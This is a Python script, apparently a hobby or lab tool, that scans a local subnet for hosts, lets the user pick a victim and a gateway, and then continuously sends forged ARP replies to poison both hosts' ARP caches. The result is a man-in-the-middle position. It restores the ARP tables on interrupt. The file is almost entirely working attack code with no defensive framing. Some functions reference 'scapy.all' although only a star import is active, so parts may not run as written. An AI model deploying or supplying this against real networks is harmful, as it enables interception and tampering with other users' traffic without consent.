#import scapy.all as scapy
#from scapy.all import ARP, Ether, srp,sniff
from scapy.all import *
import time
import os
import argparse
import sys

def arp_scanner(IP_range):
    # IP Address for the destination
    # create ARP packet
    arp = ARP(pdst=IP_range)
    # create the Ether broadcast packet
    # ff:ff:ff:ff:ff:ff MAC address indicates broadcasting
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    # stack them
    packet = ether/arp
    result = srp(packet, timeout=3)[0]
    # a list of clients, we will fill this in the upcoming loop
    clients = []
    i=0
    for sent, received in result:
        # for each response, append ip and mac address to `clients` list
        clients.append({"N":i,'ip': received.psrc, 'mac': received.hwsrc})
        i=i+1
    # print clients
    print("Available devices in the network:")
    print("  N°  IP" + " "*18+"MAC")
    for client in clients:
        print("{:3} {:16}    {}".format(client['N'],client['ip'], client['mac']))
    return clients   
def get_mac(ip):
    # Create arp packet object. pdst - destination host ip address
    arp_request = scapy.all.ARP(pdst=ip)
    # Create ether packet object. dst - broadcast mac address. 
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine two packets in two one
    arp_request_broadcast = broadcast/arp_request
    # Get list with answered hosts
    answered_list = scapy.all.srp(arp_request_broadcast, timeout=1,
                              verbose=False)[0]
    # Return host mac address
    return answered_list[0][1].hwsrc
    
def spoof(target_ip, spoof_ip):
    # Get target host ip address using previously created function
    target_mac = get_mac(target_ip)
    # Create ARP packet. target_ip - target host ip address, spoof_ip - gateway ip address
    # op=2 means that ARP is going to send answer 
    packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                       psrc=spoof_ip)
    # Send previously created packet without output
    scapy.all.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    # Get target and gateway mac address
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    # Create ARP response packet with with right arp table information
    packet = scapy.all.ARP(op=2, pdst=dest_ip, hwdst=dest_mac,
                       psrc=source_ip, hwsrc=source_mac)
    # Send packet. Count 4 to make sure that host received packet
    scapy.all.send(packet, count=4, verbose=False)
    

"""
##Argument for the program
parser = argparse.ArgumentParser()
parser.add_argument("-I", "--Interface", action="store")
parser.add_argument("-V", "--Victim_IP", action="store")
parser.add_argument("-R", "--Router_IP", action="store")
args = parser.parse_args()
#
"""
packets = 0

clients=arp_scanner("192.168.2.0/24")
target= clients[int(input("Enter Target N° :"))]
print(target['ip'])
gateway= clients[int(input("Enter Target2 N° :"))]

print(gateway['ip'])
MyMac=Ether().src
print(MyMac)

try:
    while True:
        spoof(target['ip'],gateway['ip'])
        spoof(gateway['ip'],target['ip'])
        print("\r[+] Sent packets "+ str(packets)),        
        sys.stdout.flush()
        packets +=2
        time.sleep(2)
except KeyboardInterrupt:
    print("\nInterrupted Spoofing found CTRL + C------------ Restoring to normal state..")
    restore(target['ip'],gateway['ip'])
    restore(gateway['ip'],target['ip'])
    
    

